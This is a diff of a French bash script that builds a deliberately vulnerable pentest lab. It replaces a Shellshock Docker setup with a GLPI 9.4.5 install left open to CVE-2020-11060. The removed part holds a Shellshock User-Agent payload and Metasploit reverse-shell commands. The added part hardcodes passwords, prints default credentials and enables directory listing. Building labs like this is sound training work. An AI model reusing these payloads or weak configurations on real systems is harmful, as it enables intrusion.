@@ -1,122 +1,167 @@
 #!/bin/bash
+#
+# Script d'installation GLPI 9.4.5 (vulnérable CVE-2020-11060)
+# Pour lab Iron4Software - Serveur mail 192.168.1.250
+# Isolation complète de la BDD Roundcube
+#
+
 set -e
 
-echo "================================================"
-echo "  SHELLSHOCK (CVE-2014-6271)"
-echo "  Bash Environment Variable RCE"
-echo "================================================"
-echo ""
+# Couleurs
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+NC='\033[0m'
 
-if [ "$EUID" -ne 0 ]; then 
-    echo "❌ Lance avec sudo"
+echo -e "${GREEN}================================================${NC}"
+echo -e "${GREEN}Installation GLPI 9.4.5 (Vulnérable CVE-2020-11060)${NC}"
+echo -e "${GREEN}================================================${NC}"
+
+# Configuration
+GLPI_VERSION="9.4.5"
+GLPI_URL="https://github.com/glpi-project/glpi/releases/download/${GLPI_VERSION}/glpi-${GLPI_VERSION}.tgz"
+GLPI_DIR="/var/www/html/glpi"
+GLPI_DB="glpi_db"
+GLPI_USER="glpi_user"
+GLPI_PASS="GlpiPass2024!"
+MYSQL_ROOT_PASS=""
+
+# Demander le mot de passe MySQL root
+read -sp "Mot de passe MySQL root : " MYSQL_ROOT_PASS
+echo
+
+echo -e "\n${YELLOW}[1/8] Vérification des prérequis...${NC}"
+# Vérifier si Apache et MySQL sont installés
+if ! command -v apache2 &> /dev/null; then
+    echo -e "${RED}Apache2 n'est pas installé${NC}"
     exit 1
 fi
 
+if ! command -v mysql &> /dev/null; then
+    echo -e "${RED}MySQL n'est pas installé${NC}"
+    exit 1
+fi
+
+echo -e "${YELLOW}[2/8] Installation des dépendances PHP...${NC}"
+apt-get update
+apt-get install -y \
+    php php-mysql php-mbstring php-curl php-gd php-xml \
+    php-ldap php-imap php-apcu php-xmlrpc php-cas \
+    php-zip php-bz2 php-intl php-json
+
+# Vérifier la version PHP
+PHP_VERSION=$(php -r 'echo PHP_VERSION;' | cut -d'.' -f1,2)
+echo -e "${GREEN}Version PHP détectée : ${PHP_VERSION}${NC}"
+
+echo -e "\n${YELLOW}[3/8] Création de la base de données GLPI (isolée)...${NC}"
+mysql -u root -p"${MYSQL_ROOT_PASS}" <<EOF
+-- Créer la base de données GLPI
+CREATE DATABASE IF NOT EXISTS ${GLPI_DB} CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
+
+-- Créer l'utilisateur dédié
+CREATE USER IF NOT EXISTS '${GLPI_USER}'@'localhost' IDENTIFIED BY '${GLPI_PASS}';
+
+-- Donner tous les privilèges sur la BDD GLPI uniquement
+GRANT ALL PRIVILEGES ON ${GLPI_DB}.* TO '${GLPI_USER}'@'localhost';
+FLUSH PRIVILEGES;
+
+-- Vérifier l'isolation
+SELECT user, host FROM mysql.user WHERE user IN ('${GLPI_USER}', 'roundcube');
+SHOW DATABASES;
+EOF
+
+echo -e "${GREEN}✓ Base de données ${GLPI_DB} créée et isolée${NC}"
+
+echo -e "\n${YELLOW}[4/8] Téléchargement de GLPI ${GLPI_VERSION}...${NC}"
+cd /tmp
+wget -q --show-progress ${GLPI_URL}
+
+echo -e "\n${YELLOW}[5/8] Extraction et installation...${NC}"
+tar -xzf glpi-${GLPI_VERSION}.tgz
+rm -rf ${GLPI_DIR}
+mv glpi ${GLPI_DIR}
+
+echo -e "\n${YELLOW}[6/8] Configuration des permissions...${NC}"
+chown -R www-data:www-data ${GLPI_DIR}
+chmod -R 755 ${GLPI_DIR}
+
+# Permissions spécifiques pour les répertoires critiques
+chmod -R 775 ${GLPI_DIR}/files
+chmod -R 775 ${GLPI_DIR}/config
+
+echo -e "\n${YELLOW}[7/8] Configuration Apache...${NC}"
+cat > /etc/apache2/sites-available/glpi.conf <<EOF
+# Configuration GLPI pour lab Iron4Software
+Alias /glpi ${GLPI_DIR}
+
+<Directory ${GLPI_DIR}>
+    Options -Indexes +FollowSymLinks
+    AllowOverride All
+    Require all granted
+
+    # PHP Settings pour GLPI
+    php_value max_execution_time 600
+    php_value memory_limit 256M
+    php_value post_max_size 50M
+    php_value upload_max_filesize 50M
+</Directory>
+
+# Répertoire des fichiers GLPI (vulnérable pour pentest)
+<Directory ${GLPI_DIR}/files>
+    Options +Indexes
+    AllowOverride None
+    Require all granted
+</Directory>
+EOF
+
+# Activer le site et modules Apache
+a2ensite glpi.conf
+a2enmod rewrite
+systemctl reload apache2
+
+echo -e "${GREEN}✓ Configuration Apache créée : /glpi${NC}"
+
+echo -e "\n${YELLOW}[8/8] Création du fichier de configuration BDD...${NC}"
+# Créer le fichier de config pour automatiser l'installation
+mkdir -p ${GLPI_DIR}/config
+cat > ${GLPI_DIR}/config/config_db.php <<EOF
+<?php
+class DB extends DBmysql {
+   public \$dbhost = 'localhost';
+   public \$dbuser = '${GLPI_USER}';
+   public \$dbpassword = '${GLPI_PASS}';
+   public \$dbdefault = '${GLPI_DB}';
+}
+EOF
+
+chown www-data:www-data ${GLPI_DIR}/config/config_db.php
+chmod 640 ${GLPI_DIR}/config/config_db.php
+
+# Récupérer l'IP du serveur
 SERVER_IP=$(hostname -I | awk '{print $1}')
 
-# ========================================
-# NETTOYAGE COMPLET
-# ========================================
+echo -e "\n${GREEN}================================================${NC}"
+echo -e "${GREEN}Installation GLPI 9.4.5 terminée !${NC}"
+echo -e "${GREEN}================================================${NC}"
+echo -e "\n${YELLOW}Informations importantes :${NC}"
+echo -e "URL d'accès      : http://${SERVER_IP}/glpi"
+echo -e "Base de données  : ${GLPI_DB}"
+echo -e "Utilisateur BDD  : ${GLPI_USER}"
+echo -e "Mot de passe BDD : ${GLPI_PASS}"
+echo -e "\n${YELLOW}Credentials GLPI par défaut :${NC}"
+echo -e "Compte admin     : glpi / glpi"
+echo -e "Compte tech      : tech / tech"
+echo -e "Compte normal    : normal / normal"
+echo -e "Compte post-only : post-only / postonly"
+echo -e "\n${RED}⚠️  VULNÉRABILITÉ CVE-2020-11060${NC}"
+echo -e "${RED}Cette version est volontairement vulnérable pour le pentest${NC}"
+echo -e "${RED}Exploitation possible avec compte 'tech'${NC}"
+echo -e "\n${YELLOW}Étapes suivantes :${NC}"
+echo -e "1. Accéder à http://${SERVER_IP}/glpi"
+echo -e "2. Suivre l'assistant d'installation (ou auto-configuré)"
+echo -e "3. Se connecter avec tech/tech"
+echo -e "4. Exploiter avec : ${GREEN}CVE-2020-11060${NC}"
+echo -e "\n${YELLOW}Vérification isolation BDD :${NC}"
+mysql -u root -p"${MYSQL_ROOT_PASS}" -e "SHOW DATABASES;" | grep -E "(glpi|roundcube)"
 
-echo "[1/4] Nettoyage total..."
-docker stop tomcat-vuln phpmyadmin-vuln struts2-vuln webmin-vuln dvwa-vuln shellshock-vuln 2>/dev/null || true
-docker rm tomcat-vuln phpmyadmin-vuln struts2-vuln webmin-vuln dvwa-vuln shellshock-vuln 2>/dev/null || true
-echo "   ✅ Nettoyage terminé"
-
-# ========================================
-# INSTALLATION SHELLSHOCK
-# ========================================
-
-echo "[2/4] Installation Shellshock..."
-docker pull vulnerables/cgi-bin
-
-echo "[3/4] Lancement container (port 8080)..."
-docker run -d \
-    --name shellshock-vuln \
-    --restart unless-stopped \
-    -p 8080:80 \
-    vulnerables/cgi-bin
-
-echo "[4/4] Vérification (10 secondes)..."
-sleep 10
-
-# Vérifier que le container tourne
-if ! docker ps | grep -q shellshock-vuln; then
-    echo "❌ Container non actif"
-    docker logs shellshock-vuln
-    exit 1
-fi
-
-# Vérifier l'accès HTTP
-HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:8080/ 2>/dev/null)
-
-if [ "$HTTP_CODE" != "200" ]; then
-    echo "⚠️  HTTP $HTTP_CODE (peut être normal)"
-fi
-
-# Test Shellshock manuel
-TEST=$(curl -s -A "() { :; }; echo vulnerable" http://localhost:8080/cgi-bin/shock.cgi 2>/dev/null | grep -o vulnerable || echo "")
-
-echo ""
-echo "================================================"
-echo "  ✅ SHELLSHOCK INSTALLÉ !"
-echo "================================================"
-echo ""
-docker ps | grep shellshock
-echo ""
-echo "📊 Configuration:"
-echo "   Vulnérabilité: Shellshock (CVE-2014-6271)"
-echo "   Container: vulnerables/cgi-bin"
-echo "   Port: 8080"
-echo "   URL: http://${SERVER_IP}:8080/"
-echo "   Script CGI: /cgi-bin/shock.cgi"
-
-if [ -n "$TEST" ]; then
-    echo "   Status: ✅ VULNÉRABLE (test manuel OK)"
-else
-    echo "   Status: ⚠️  À vérifier avec Metasploit"
-fi
-
-echo ""
-echo "================================================"
-echo "  🔥 EXPLOITATION METASPLOIT"
-echo "================================================"
-echo ""
-echo "DEPUIS KALI:"
-echo ""
-echo "msfconsole -q"
-echo "use exploit/multi/http/apache_mod_cgi_bash_env_exec"
-echo "set RHOSTS ${SERVER_IP}"
-echo "set RPORT 8080"
-echo "set TARGETURI /cgi-bin/shock.cgi"
-echo "set LHOST 192.168.100.10"
-echo "set LPORT 4444"
-echo "check"
-echo "exploit"
-echo ""
-echo "ALTERNATIVE SI ÉCHEC:"
-echo "set TARGETURI /cgi-bin/test.cgi"
-echo "exploit"
-echo ""
-echo "================================================"
-echo "  📖 SCÉNARIO LAB"
-echo "================================================"
-echo ""
-echo "Iron4Software utilise des scripts CGI pour:"
-echo "- Monitoring serveur mail (stats temps réel)"
-echo "- Consultation logs Postfix/Dovecot"
-echo "- Alertes système automatiques"
-echo "- Interface web admin basique"
-echo ""
-echo "CVE-2014-6271 (Shellshock):"
-echo "Bash vulnérable permet l'injection de code"
-echo "via variables d'environnement HTTP (User-Agent,"
-echo "Cookie, Referer, etc.)"
-echo ""
-echo "Impact: RCE avec privilèges du serveur web"
-echo "MITRE ATT&CK: T1190 (Exploit Public-Facing App)"
-echo ""
-echo "================================================"
-echo "  ✅ PRÊT POUR EXPLOITATION"
-echo "================================================"
-echo ""
+echo -e "\n${GREEN}Script terminé avec succès !${NC}"
